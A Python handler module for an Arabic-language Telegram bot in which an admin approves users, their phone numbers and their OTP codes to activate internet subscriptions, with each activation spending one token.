# handlers/button_handler.py
from telegram import Update
from telegram.ext import CallbackContext
from config import users, ADMIN_ID
from keyboards.main_menu_keyboard import get_user_main_menu
import logging

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

MESSAGES = {
    "profile_info": "معلومات الملف الشخصي:\nالاسم: {}\nأرقام الهواتف المشتركة: {}\nالرموز المتبقية: {}",
    "tokens_remaining": "الرموز المتبقية: {}",
    "send_phone": "الرجاء إرسال رقم هاتفك للاشتراك في الإنترنت",
    "no_tokens": "لقد نفدت الرموز المتاحة لديك. لا يمكنك إضافة المزيد من الأرقام.",
    "account_approved": "تم الموافقة على حسابك! يرجى إرسال رقم هاتفك للاشتراك في الإنترنت.",
    "phone_approved": "تمت الموافقة على رقم الهاتف. يرجى إدخال رمز التحقق (OTP) الخاص بك:",
    "otp_approved": "تمت الموافقة على رمز التحقق! تم تفعيل الاشتراك في الإنترنت لرقم {}. الرموز المتبقية: {}",
    "account_rejected": "عذرًا، تم رفض طلبك.",
    "phone_rejected": "تم رفض رقم الهاتف. حاول مرة أخرى.",
    "otp_rejected": "تم رفض رمز التحقق. حاول مرة أخرى.",
}

ADMIN_MESSAGES = {
    "user_approved": "تمت الموافقة على المستخدم {}",
    "phone_approved": "تمت الموافقة على رقم الهاتف للمستخدم {}",
    "otp_approved": "تمت الموافقة على رمز التحقق للمستخدم {} ورقم {}",
    "user_rejected": "تم رفض طلب المستخدم",
    "phone_rejected": "تم رفض رقم الهاتف",
    "otp_rejected": "تم رفض رمز التحقق",
}

def log_user_state(user_id, message=""):
    if user_id in users:
        state_info = f"User ID: {user_id}, Name: {users[user_id].get('name', 'None')}, "
        state_info += f"Approved: {users[user_id].get('approved', False)}, "
        state_info += f"Phones: {users[user_id].get('phones', [])}, "
        state_info += f"OTP Verified Numbers: {users[user_id].get('otp_verified_numbers', [])}"
        if message:
            state_info = f"{message}: {state_info}"
        logger.info(state_info)

async def button_handler(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    log_user_state(user_id, f"Button pressed: {data}")
    
    if data == "profile":
        if user_id in users:
            phones_str = ", ".join(users[user_id]["otp_verified_numbers"]) if users[user_id]["otp_verified_numbers"] else "لا يوجد"
            await query.edit_message_text(
                MESSAGES["profile_info"].format(users[user_id]["name"], phones_str, users[user_id]["tokens"]),
                reply_markup=get_user_main_menu(user_id)
            )
            return 7  # MAIN_MENU
    
    elif data == "tokens":
        if user_id in users:
            await query.edit_message_text(
                MESSAGES["tokens_remaining"].format(users[user_id]["tokens"]),
                reply_markup=get_user_main_menu(user_id)
            )
            return 7  # MAIN_MENU
    
    elif data == "send_phone":
        if users[user_id]["tokens"] > 0:
            users[user_id]["state"] = 3  # PHONE
            users[user_id]["current_phone"] = ""
            users[user_id]["current_otp"] = ""
            await query.edit_message_text(MESSAGES["send_phone"])
            return 3  # PHONE
        else:
            await query.edit_message_text(
                MESSAGES["no_tokens"],
                reply_markup=get_user_main_menu(user_id)
            )
            return 7  # MAIN_MENU
    
    elif data.startswith("approve_") or data.startswith("reject_"):
        if user_id == ADMIN_ID:
            if data.startswith("approve_"):
                return await handle_admin_approval(update, context)
            else:
                return await handle_admin_rejection(update, context)
        else:
            return users[user_id].get("state", 7)  # MAIN_MENU
    
    return users[user_id].get("state", 7)  # MAIN_MENU

async def handle_admin_approval(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    data = query.data
    admin_id = update.effective_user.id
    
    if admin_id != ADMIN_ID:
        return -1  # ConversationHandler.END
    
    logger.info(f"Admin approval: {data}")
    
    if data.startswith("approve_") and "_phone_" not in data and "_otp_" not in data:
        user_id = int(data.split("_")[1])
        if user_id in users:
            users[user_id]["approved"] = True
            users[user_id]["state"] = 3  # PHONE
            await context.bot.send_message(
                user_id, 
                MESSAGES["account_approved"],
                reply_markup=get_user_main_menu(user_id)
            )
            await query.edit_message_text(ADMIN_MESSAGES["user_approved"].format(users[user_id]["name"]))
            log_user_state(user_id, "User approved")
    
    elif data.startswith("approve_phone_"):
        user_id = int(data.split("_")[2])
        if user_id in users:
            users[user_id]["state"] = 5  # OTP
            await context.bot.send_message(user_id, MESSAGES["phone_approved"])
            await query.edit_message_text(ADMIN_MESSAGES["phone_approved"].format(users[user_id]["name"]))
            log_user_state(user_id, "Phone approved")
    
    elif data.startswith("approve_otp_"):
        user_id = int(data.split("_")[2])
        if user_id in users:
            phone = users[user_id]["current_phone"]
            users[user_id]["phones"].append(phone)
            users[user_id]["otp_verified_numbers"].append(phone)
            users[user_id]["tokens"] -= 1
            users[user_id]["state"] = 7  # MAIN_MENU
            await context.bot.send_message(
                user_id, 
                MESSAGES["otp_approved"].format(phone, users[user_id]["tokens"]),
                reply_markup=get_user_main_menu(user_id)
            )
            await query.edit_message_text(ADMIN_MESSAGES["otp_approved"].format(users[user_id]["name"], phone))
            log_user_state(user_id, "OTP approved")
    
    return -1  # ConversationHandler.END

async def handle_admin_rejection(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    data = query.data
    admin_id = update.effective_user.id
    
    if admin_id != ADMIN_ID:
        return -1  # ConversationHandler.END
    
    logger.info(f"Admin rejection: {data}")
    
    if data.startswith("reject_") and "_phone_" not in data and "_otp_" not in data:
        user_id = int(data.split("_")[1])
        if user_id in users:
            del users[user_id]
            await context.bot.send_message(user_id, MESSAGES["account_rejected"])
            await query.edit_message_text(ADMIN_MESSAGES["user_rejected"])
    
    elif data.startswith("reject_phone_"):
        user_id = int(data.split("_")[2])
        if user_id in users:
            users[user_id]["current_phone"] = ""
            users[user_id]["state"] = 3  # PHONE
            await context.bot.send_message(
                user_id, 
                MESSAGES["phone_rejected"],
                reply_markup=get_user_main_menu(user_id)
            )
            await query.edit_message_text(ADMIN_MESSAGES["phone_rejected"])
            log_user_state(user_id, "Phone rejected")
    
    elif data.startswith("reject_otp_"):
        user_id = int(data.split("_")[2])
        if user_id in users:
            users[user_id]["current_otp"] = ""
            users[user_id]["state"] = 5  # OTP
            await context.bot.send_message(
                user_id, 
                MESSAGES["otp_rejected"],
                reply_markup=get_user_main_menu(user_id)
            )
            await query.edit_message_text(ADMIN_MESSAGES["otp_rejected"])
            log_user_state(user_id, "OTP rejected")
    
    return -1  # ConversationHandler.END